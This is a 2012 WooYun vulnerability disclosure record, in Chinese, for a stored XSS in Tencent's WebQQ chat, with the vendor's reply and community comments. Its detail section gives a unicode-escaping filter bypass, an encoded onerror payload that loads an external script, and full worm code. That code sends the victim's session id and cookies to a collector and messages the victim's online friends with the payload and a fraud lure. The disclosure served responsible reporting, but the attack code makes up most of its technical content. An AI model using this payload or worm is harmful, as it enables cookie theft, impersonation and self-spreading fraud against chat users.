{"id": 18640, "wybug_id": "wooyun-2012-08487", "wybug_title": "腾讯WEBQQ聊天功能XSS - 附带消息蠕虫代码", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2012-06-19 15:33", "wybug_open_date": "2012-08-03 15:33", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "持久型", "利用技巧", "黑盒", "蠕虫", "安全策略失效", "安全策略绕过", "检测技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-03：\t细节向公众公开  简要描述： 由于找到百度Hi的一个存储型Xss, 不好意思的，于是我又联想到了WEBQQ，然后就找到了。。这个挺有意思吧～～ 附带一个通过聊天消息传播的蠕虫代码。  详细说明：  1. 首先上传一个正常的图片，抓包并发送消息，看输入。\n\n2. 然后再接收方，打开调试工具，看输出～\n\n3. 可以看到，输入和输出有同样的内容。。4. 试了下输入处可以在后面添加内容，接着我们就是想着如何构造输入，导致畸形输出。5. 常规的 \",> 试都没试，这个要是没过滤的话。。就太低级的了。。6. 首先测试 &quot;&gt; 这个经常导致存储型Xss的组合。 结果被过滤了。。\n\n7. 接着，既然是json数据，我们用\\u0022\\u003e来表示 \"> 应该也是可以的，结果应该服务器端解析错误。返回的retcode不等于0.\n\n8. ******  重点在这里 ******由于WEBQQ的消息内容是动态推送的，我就联想到了， xxx.innerHTML=\"\\u0022\\u003e\" 会输出为 \">，我做以下猜测。   \\\\u0022\\\\u003e -->(经过服务器端会输出为)--> \\u0022\\u003e -->(经过innerHTML输出为) \">9. 基于上面这个想法，我们做了下面的测试，结果。。。侧漏了\n\n10. 接着后就好办了。构造利用代码。\n\"onerror=\"$H.loadScript('http://www.toolmao.com/tool/qqworm.js')//\n-->unicode编码转换\n\\u0022\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003D\\u0022\\u0024\\u0048\\u002e\\u006c\\u006f\\u0061\\u0064\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074\\u0028\\u0027\\u0068\\u0074\\u0074\\u0070\\u003A\\u002f\\u002f\\u0077\\u0077\\u0077\\u002e\\u0074\\u006f\\u006f\\u006c\\u006d\\u0061\\u006f\\u002e\\u0063\\u006f\\u006d\\u002f\\u0074\\u006f\\u006f\\u006c\\u002f\\u0071\\u0071\\u0077\\u006f\\u0072\\u006d\\u002e\\u006a\\u0073\\u0027\\u0029\\u002f\\u002f\n--> 然后将 \\ 全部转换为 \\\\ ，并且加入到发送的数据r字段的 offpic参数处。\n{\"to\":3591158871,\"face\":471,\"content\":\"[[\\\"offpic\\\",\\\"/b770c7e7-8032-42f9-9a75-50a69cb316d2\\\\u0022\\\\u006f\\\\u006e\\\\u0065\\\\u0072\\\\u0072\\\\u006f\\\\u0072\\\\u003D\\\\u0022\\\\u0024\\\\u0048\\\\u002e\\\\u006c\\\\u006f\\\\u0061\\\\u0064\\\\u0053\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u0028\\\\u0027\\\\u0068\\\\u0074\\\\u0074\\\\u0070\\\\u003A\\\\u002f\\\\u002f\\\\u0077\\\\u0077\\\\u0077\\\\u002e\\\\u0074\\\\u006f\\\\u006f\\\\u006c\\\\u006d\\\\u0061\\\\u006f\\\\u002e\\\\u0063\\\\u006f\\\\u006d\\\\u002f\\\\u0074\\\\u006f\\\\u006f\\\\u006c\\\\u002f\\\\u0071\\\\u0071\\\\u0077\\\\u006f\\\\u0072\\\\u006d\\\\u002e\\\\u006a\\\\u0073\\\\u0027\\\\u0029\\\\u002f\\\\u002f\\\",\\\"icon_appblue.png\\\",49756],\\\"\\\\n\\\",[\\\"font\\\",{\\\"name\\\":\\\"test\\\",\\\"size\\\":\\\"10\\\",\\\"style\\\":[0,0,0],\\\"color\\\":\\\"000000\\\"}]]\",\"msg_id\":80810004,\"clientid\":\"1181874\",\"psessionid\":\"8368046764001e636f6e6e7365727665725f77656271714031302e3132382e36362e3131320000529000001be102620083d4486d0000000a4033414761756d5857636d00000028eb9e99a6355d08861632d2769b7b12c0c73d2bbec1da7df3b88da7a914a97d3f5549e4aed22a2137\"}\n11. 发送利用代码，接收方调用我们的外部文件。\n\n12. 为了进一步演示此漏洞危害， 编写了以下蠕虫代码进行测试。qqworm.js\n//alert(\"a web qq worm by gainover\");$H.loadScript(\"http://localhost:8080/bugtest/qqworm.php?sid=\"+EQQ.getPsessionid()+\"&cid=\"+EQQ.Model.ChatMsg.getClientidFromRpc()+\"&cookie=\"+encodeURIComponent(document.cookie));\nqqworm.php\n<?\terror_reporting(1);\tinclude \"./_class/xmlhttp.php\";\t//echo \"web qq worm test\";\t$clientid=$_GET[\"cid\"];\t$psessionid=$_GET[\"sid\"];\t$ck=$_GET[\"cookie\"];\tfunction getQQ(){\t\t//get online friends\t\tglobal $clientid,$psessionid,$ck;\t\t$req=new XMLHTTP();\t\t$req->open(\"http://d.web2.qq.com/channel/get_online_buddies2?clientid=\".$clientid.\"&psessionid=\".$psessionid,\"GET\");\t\t$req->addsendheader(\"User-Agent\",\"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\");\t\t$req->addsendheader(\"Referer\",\"http://d.web2.qq.com/proxy.html?v=20110331002&callback=1&id=2\");\t\t$req->addsendheader(\"Origin\",\"http://d.web2.qq.com\");\t\t$req->addsendheader(\"Cookie\",$ck);\t\t//$req->addsendheader(\"Connection\",\"Close\");\t\t$req->send();\t\t$content=$req->resbody();\t\t$req->close();\t\techo $content;\t\tif($content){\t\t\t$tmpobj=json_decode($content,true);\t\t\tif($tmpobj[\"retcode\"]==0){\t\t\t\t$sendqq=array();\t\t\t\t//从列表里将webQQ的用户加入\t\t\t\t$qqlist=$tmpobj[\"result\"];\t\t\t\tforeach($qqlist as $qq){\t\t\t\t\t//limited in test QQ number.\t\t\t\t\tif(($qq[\"uin\"]==\"1974530220\"||$qq[\"uin\"]==\"1049174111\")){\t\t\t\t\t\t$sendqq[]=$qq;\t\t\t\t\t}\t\t\t\t} \t\t\t\t//var_dump($sendqq);\t\t\t\tsendToQQ($sendqq);\t\t\t}else{\t\t\t\techo \"window.___tmp='\".$tmpobj[\"retcode\"].\"';\";\t\t\t}\t\t}else{\t\t\techo \"window.___tmp='error';\";\t\t}\t}\tfunction sendMsg($qqobj){\t\tglobal $clientid,$psessionid,$ck;\t\t$qq=$qqobj[\"uin\"];\t\t$ctype=$qqobj[\"client_type\"];\t\t$req=new XMLHTTP();\t\t$req->open(\"http://d.web2.qq.com/channel/send_buddy_msg2\",\"POST\");\t\t$req->addsendheader(\"User-Agent\",\"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\");\t\t$req->addsendheader(\"Referer\",\"http://d.web2.qq.com/proxy.html?v=20110331002&callback=1&id=2\");\t\t$req->addsendheader(\"Origin\",\"http://d.web2.qq.com\");\t\t$req->addsendheader(\"Cookie\",$ck);\t\t//$req->addsendheader(\"Connection\",\"Close\");\t\t$sendstr=\"{\\\"to\\\":\".$qq.\",\\\"face\\\":471,\\\"content\\\":\\\"[\\\\\\\"show me some money!!\\\\\\\",[\\\\\\\"font\\\\\\\",{\\\\\\\"name\\\\\\\":\\\\\\\"test\\\\\\\",\\\\\\\"size\\\\\\\":\\\\\\\"10\\\\\\\",\\\\\\\"style\\\\\\\":[0,0,0],\\\\\\\"color\\\\\\\":\\\\\\\"000000\\\\\\\"}]]\\\",\\\"msg_id\\\":21910004,\\\"clientid\\\":\\\"\".$clientid.\"\\\",\\\"psessionid\\\":\\\"\".$psessionid.\"\\\"}\";\t\tif($ctype==41){\t\t\t//if friend use web qq\t\t\t$sendstr=\"{\\\"to\\\":\".$qq.\",\\\"face\\\":471,\\\"content\\\":\\\"[[\\\\\\\"offpic\\\\\\\",\\\\\\\"/40dcbb28-3ec0-4300-8613-41be547b6eeb\\\\\\\\u0022\\\\\\\\u006f\\\\\\\\u006e\\\\\\\\u0065\\\\\\\\u0072\\\\\\\\u0072\\\\\\\\u006f\\\\\\\\u0072\\\\\\\\u003D\\\\\\\\u0022\\\\\\\\u0024\\\\\\\\u0048\\\\\\\\u002e\\\\\\\\u006c\\\\\\\\u006f\\\\\\\\u0061\\\\\\\\u0064\\\\\\\\u0053\\\\\\\\u0063\\\\\\\\u0072\\\\\\\\u0069\\\\\\\\u0070\\\\\\\\u0074\\\\\\\\u0028\\\\\\\\u0027\\\\\\\\u0068\\\\\\\\u0074\\\\\\\\u0074\\\\\\\\u0070\\\\\\\\u003A\\\\\\\\u002f\\\\\\\\u002f\\\\\\\\u0077\\\\\\\\u0077\\\\\\\\u0077\\\\\\\\u002e\\\\\\\\u0074\\\\\\\\u006f\\\\\\\\u006f\\\\\\\\u006c\\\\\\\\u006d\\\\\\\\u0061\\\\\\\\u006f\\\\\\\\u002e\\\\\\\\u0063\\\\\\\\u006f\\\\\\\\u006d\\\\\\\\u002f\\\\\\\\u0074\\\\\\\\u006f\\\\\\\\u006f\\\\\\\\u006c\\\\\\\\u002f\\\\\\\\u0071\\\\\\\\u0071\\\\\\\\u0077\\\\\\\\u006f\\\\\\\\u0072\\\\\\\\u006d\\\\\\\\u002e\\\\\\\\u006a\\\\\\\\u0073\\\\\\\\u0027\\\\\\\\u0029\\\\\\\\u002f\\\\\\\\u002f\\\\\\\",\\\\\\\"icon5.png\\\\\\\",1844],\\\\\\\"\\\\\\\",\\\\\\\"\\\\\\\",[\\\\\\\"font\\\\\\\",{\\\\\\\"name\\\\\\\":\\\\\\\"Arial\\\\\\\",\\\\\\\"size\\\\\\\":\\\\\\\"10\\\\\\\",\\\\\\\"style\\\\\\\":[0,0,0],\\\\\\\"color\\\\\\\":\\\\\\\"339966\\\\\\\"}]]\\\",\\\"msg_id\\\":21910004,\\\"clientid\\\":\\\"\".$clientid.\"\\\",\\\"psessionid\\\":\\\"\".$psessionid.\"\\\"}\";\t\t}\t\t//echo $sendstr;\t\t$req->addsendlist(\"r\",$sendstr);\t\t$req->addsendlist(\"clientid\",$clientid);\t\t$req->addsendlist(\"psessionid\",$psessionid);\t\t$req->send();\t\t$content=$req->resbody();\t\t$req->close();\t\techo $content;\t}\tfunction sendToQQ($qqlist){\t\tforeach($qqlist as $qq){\t\t\t//echo $qq.\"<br/>\";\t\t\tsendMsg($qq);\t\t\tsleep(10);\t\t}\t}\t//main function \tgetQQ();?>\n13. 本蠕虫代码中为测试用，对被传播的在线用户进行了限制，其工作原理及真实演示效果见漏洞证明。    漏洞证明：  找到一个WEBQQ在线的用户，发送消息，当用户点开消息后，恶意代码将被执行，受害用户会 在自己【毫不知情的情况下】向在线的好友发送虚假消息，如果其好友也是WEBQQ在线，将被发送带有恶意代码的消息。～～\n\n   修复方案：  对服务器端逻辑不是很清楚， 消息代码里，对 \\ 进行过滤？ 仅猜测。。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-06-19 16:13 厂商回复： thanks，感谢反馈，我们正在跟进修复中~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-19 15:33 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  我擦~对客户端工具有效么@@估计不行吧    \n     2012-06-19 15:36 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我信洞主    \n     2012-06-19 15:38 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @一刀终情 = = WEB的，对客户端，可以发送欺诈消息，比如“我没钱了。。”     \n     2012-06-19 15:41 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  屌爆了，求zone内分享啊    \n     2012-06-19 15:44 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我擦。。。这样搞，压力巨大。果断上700再说。    \n     2012-06-19 16:01 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @gainover 真是碉堡了……    \n     2012-06-19 16:29 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Xhm1n9 最后都公开的吧    \n     2012-06-19 16:33 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  主要是想早点看到:)    \n     2012-06-19 16:40 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  屌爆了！！！    \n     2012-06-19 16:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @p.z 海边的妹子泡完了？    \n     2012-06-19 16:53 |    \t\tEoh \t\t\t( 普通白帽子  |\t\t\t        Rank:286 漏洞数:35        )\t\t \n  碉堡了，求群，求文章分享    \n     2012-06-19 18:19 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @zeracker @gainover 两位相差5分~~    \n     2012-06-19 18:51 |    \t\tHenry:bobo \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:22        | 本胖吊！~又高又肥2个奶奶像地雷)\t\t \n  我信洞主！    \n     2012-06-20 08:25 |    \t\t肥田鸡 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 今天的最好表现是明天的最低要求)\t\t \n  厉害~    \n     2012-06-20 08:43 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  @xsser 海边好咸湿！！！    \n     2012-06-20 22:53 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  膜拜挖到的这个蠕虫    \n     2012-06-21 13:16 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  洞主v587！    \n     2012-06-22 12:49 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  @gainover 给我个struts2 利用工具吧 saviourtech@qq.com    \n     2012-06-23 00:57 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  这个得双方同时webQQ在线吧    \n     2012-06-24 12:07 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  碉炸了    \n     2012-06-24 22:26 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  我猜下一个是 淘宝的旺旺web    \n     2012-06-25 08:58 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  新浪微博的聊天    \n     2012-06-28 21:58 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 恭喜你，猜对了。     \n     2012-06-28 22:12 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  @gainover 给我个struts2 利用工具吧 saviourtech@qq.com    \n     2012-06-28 23:50 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @saviour 需要研究此工具，直接看此贴： WooYun: 香港电视台Struts2漏洞    \n     2012-06-28 23:55 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  @gainover 那个火狐上的是插件吗？    \n     2012-06-28 23:59 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @saviour 嗯，是什么插件不重要，那个只是模拟POST一段EXP数据而已。只要是可以抓包发包的工具都可以实现。    \n     2012-07-19 16:37 |    \t\t小猪太子 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:8        | 地球人)\t\t \n  @gainover 洞主屌爆了，阿里巴巴的WEB旺旺可以试试，这个如果用来发广告，洞主可以捞金了    \n     2012-07-19 17:01 |    \t\tca3tie1 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | castiel)\t\t \n  这个碉堡了！！！    \n     2012-07-19 17:09 |    \t\tleehenwu \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:24        | 撸·啊·撸)\t\t \n  屌爆了    \n     2012-07-19 17:30 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  碉堡啦    \n     2012-08-01 13:38 |    \t\tWebSPRing \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:18        | Focus on Web Security (wspringox@gmail.c...)\t\t \n  思路相当赞啊！    \n     2012-08-01 15:07 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  霸气测漏啊    \n     2012-08-03 15:53 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  @gainover犀利啊犀利，果然你每次“运气”都很好~哈哈哈，多向你学习～    \n     2012-08-03 22:52 |    \t\tprincehaku \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 无证程序员)\t\t \n  牛逼啊    \n     2012-08-07 17:37 |    \t\t熊熊 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 熊眼看世界，越看越精彩!专注于技术、金融...)\t\t \n  Charles相当牛B啊    \n     2012-08-16 11:34 |    \t\tTopman王 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:6        | 软件开发工程师!白帽子!XSSER,渗透,SEO)\t\t \n  Charles相当牛B啊    \n     2013-01-06 14:56 |    \t\trivers \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:10        | research on web security)\t\t \n  膜拜gainover真神    \n     2013-05-31 14:30 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  帅..    \n     2013-06-08 19:32 |    \t\t小权 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 小菜鸟，求各位大姐大哥多多指教)\t\t \n  碉堡了。    \n     2013-06-16 13:53 |    \t\t屌丝一枚 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 屌丝一个，蛋疼的。)\t\t \n  碉堡了，，，，感觉不会再爱、、    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}